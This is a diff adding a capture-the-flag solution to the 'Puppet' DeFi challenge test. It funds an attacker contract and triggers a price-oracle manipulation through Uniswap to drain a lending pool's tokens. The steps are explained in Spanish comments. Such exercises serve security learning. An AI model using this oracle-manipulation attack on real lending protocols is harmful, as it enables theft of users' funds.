@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -103,6 +104,40 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackerFactory = await ethers.getContractFactory("PuppetAttacker");
+        const attackerContract = await attackerFactory.deploy(this.token.address, this.uniswapExchange.address,this.lendingPool.address);
+        
+        console.log(`\n_/_/_/_/_/ PREVIO FONDEO _/_/_/_/_/\n`);
+        console.log(`BALANCE EN ETH DE CONTRATO ATACANTE: ${await ethers.provider.getBalance(attackerContract.address)}`);
+        console.log(`BALANCE EN DVT DE CONTRATO ATACANTE: ${await this.token.balanceOf(attackerContract.address)}\n`);
+        console.log(`_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/\n`);
+
+        // Fondeamos el contrato atacante dado que deberá:
+        // - Llamar a la función "borrow", que requiere enviar ether.
+        // - Intercambiar DVT por ETH para desbalancear el oráculo onchain que utiliza puppetPool.
+        
+        await attacker.sendTransaction(
+        { 
+          to: attackerContract.address,
+          value: ethers.utils.parseEther("24") // ATTACKER_INITIAL_ETH_BALANCE - 1 --> Necesario reservar uno para poder satisfacer el gas necesario.
+        }
+        );
+          
+        await this.token.connect(attacker).transfer(attackerContract.address, ethers.utils.parseEther("999.999999999999999999")); // En realidad resultará más redituable enviar la totalidad de  DVT que tengamos (1000), pero para pasar el test debemos tener más tokens que lo que inicialmente tenía la pool (Basta con tener apenas una mínima porción más de DVT), así que nos guardamos ese mínimo (de la suerte tal vez?).
+
+        console.log(`_/_/_/_/_/ LUEGO DEL FONDEO _/_/_/_/_/\n`);
+        console.log(`BALANCE EN ETH DE CONTRATO ATACANTE: ${await ethers.provider.getBalance(attackerContract.address)}`);
+        console.log(`BALANCE EN DVT DE CONTRATO ATACANTE: ${await this.token.balanceOf(attackerContract.address)}\n`);
+        console.log(`_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/\n`);
+
+        // El contrato atacante intercambia sus DVT por ETH en uniswap, desbalancea el oráculo, toma los DVT de puppetPool y los envía a nuestra cuenta attacker.
+        console.log("COMENZANDO ATAQUE...\n");
+        await attackerContract.connect(attacker).attack({gasLimit:1e6});
+        console.log("ATAQUE FINALIZADO CON ÉXITO\n");
+
+        console.log(`BALANCE DEL ATACANTE EN DVT: ${await this.token.balanceOf(attacker.address)}`);
+        console.log(`BALANCE DEL ATACANTE EN ETH: ${await ethers.provider.getBalance(attacker.address)}`);
     });
 
     after(async function () {
